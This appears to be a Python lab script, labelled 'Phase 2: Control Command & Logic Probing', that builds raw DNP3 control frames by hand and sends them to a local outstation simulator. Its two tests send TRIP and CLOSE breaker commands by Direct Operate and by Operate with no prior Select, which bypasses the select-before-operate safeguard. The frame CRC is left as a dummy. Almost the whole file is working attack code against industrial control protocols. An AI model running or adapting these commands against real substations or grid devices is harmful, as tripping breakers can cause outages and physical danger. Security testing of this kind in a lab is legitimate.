import socket
from rich.console import Console
from rich.table import Table

console = Console()

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 20000

# CROB Control Codes
CROB_PULSE_ON  = 0x01
CROB_LATCH_ON  = 0x03
CROB_LATCH_OFF = 0x04
CROB_TRIP      = 0x81  # TRIP (0x80) + Pulse On (0x01)
CROB_CLOSE     = 0x41  # CLOSE (0x40) + Pulse On (0x01)

def build_crob_payload(control_code=CROB_PULSE_ON, count=1, on_time_ms=1000, off_time_ms=1000):
    """
    Builds an 11-byte CROB Object Group 12 Var 1 payload:
      - 1 Byte: Control Code
      - 1 Byte: Count
      - 4 Bytes: On-Time (Little Endian uint32)
      - 4 Bytes: Off-Time (Little Endian uint32)
      - 1 Byte: Status Code (0x00 = Success on request)
    """
    crob = bytearray()
    crob.append(control_code)
    crob.append(count)
    crob.extend(on_time_ms.to_bytes(4, byteorder='little'))
    crob.extend(off_time_ms.to_bytes(4, byteorder='little'))
    crob.append(0x00)  # Status Code
    return crob

def build_dnp3_control_frame(function_code, crob_payload, point_index=0):
    """
    Constructs an FT3 Frame carrying a DNP3 Control Request (FC 0x03, 0x04, 0x05, 0x06).
    Header: Object Group 12 Var 1, Qualifier 0x17 (1-byte index range).
    """
    # Application Layer Header: App Ctrl (FIR=1, FIN=1, CON=0, UNS=0, SEQ=1) -> 0xC1
    app_header = bytes([0xC1, function_code])
    
    # Object Header: Group 12 (0x0C), Var 1 (0x01), Qualifier 0x17 (1-byte count + index)
    obj_header = bytes([0x0C, 0x01, 0x17, 0x01, point_index])
    
    app_payload = app_header + obj_header + crob_payload
    
    # Transport Header: FIR=1, FIN=1, SEQ=1 -> 0xC1
    tp_payload = bytes([0xC1]) + app_payload
    
    # Data Link FT3 Frame
    # Sync (0x05 0x64), Length, Control (0xC4 = DIR=1, PRM=1, FC=User Data), Dest (1), Src (0)
    length = len(tp_payload) + 5  # Length includes Link header fields except sync/len/crc
    dl_header = bytearray([0x05, 0x64, length, 0xC4, 0x01, 0x00, 0x00, 0x00])
    
    # Simple header dummy CRC calculation for local lab simulation frame
    dl_header.extend([0x00, 0x00])
    
    return bytes(dl_header) + tp_payload

def execute_control_test(test_name, function_code, crob_code, description):
    console.print(f"\n[bold yellow][*] Executing Test: {test_name}[/bold yellow]")
    console.print(f"[dim]{description}[/dim]")
    
    crob = build_crob_payload(control_code=crob_code, on_time_ms=5000)
    frame = build_dnp3_control_frame(function_code, crob, point_index=0)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        s.connect((TARGET_HOST, TARGET_PORT))
        
        console.print(f"[cyan][->] Sending FC 0x{function_code:02X} (CROB Code: 0x{crob_code:02X}) - Frame length: {len(frame)} bytes[/cyan]")
        s.send(frame)
        
        response = s.recv(1024)
        if response:
            console.print(f"[bold green][✓] Outstation Response ({len(response)} bytes):[/bold green] {response.hex(' ')}")
        else:
            console.print("[dim][!] No response frame returned.[/dim]")
        s.close()
    except Exception as e:
        console.print(f"[red][!] Error: {e}[/red]")

if __name__ == "__main__":
    console.print("[bold green]=== DNP3 Phase 2: Control Command & Logic Probing ===[/bold green]")
    
    # Test 1: Direct Operate (FC 0x05) - TRIP Breaker
    execute_control_test(
        "Direct Operate (FC 0x05) - TRIP Command",
        function_code=0x05,
        crob_code=CROB_TRIP,
        description="Attempts single-phase output execution without prior SBO Select."
    )
    
    # Test 2: Un-armed Operate (FC 0x04)
    execute_control_test(
        "Un-armed Operate (FC 0x04)",
        function_code=0x04,
        crob_code=CROB_CLOSE,
        description="Sends Operate (FC 0x04) directly without an active Select reservation."
    )